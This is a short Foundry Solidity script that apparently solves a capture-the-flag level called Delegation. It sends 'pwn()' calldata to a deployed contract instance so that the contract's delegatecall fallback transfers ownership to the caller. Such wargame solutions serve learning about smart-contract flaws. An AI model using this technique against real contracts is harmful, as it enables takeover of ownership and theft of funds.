// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/Lv-06/Delegation.sol";

contract DelegationScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN Delegation INSTANCE ADDRESS
        Delegation _delegate =  Delegation(0x49F023C30b127c0E3d341FC6bc85252DDFf8dC39);
        bytes memory data = abi.encodeWithSignature("pwn()");
        address(_delegate).call(data);
        vm.stopBroadcast();
    }
}
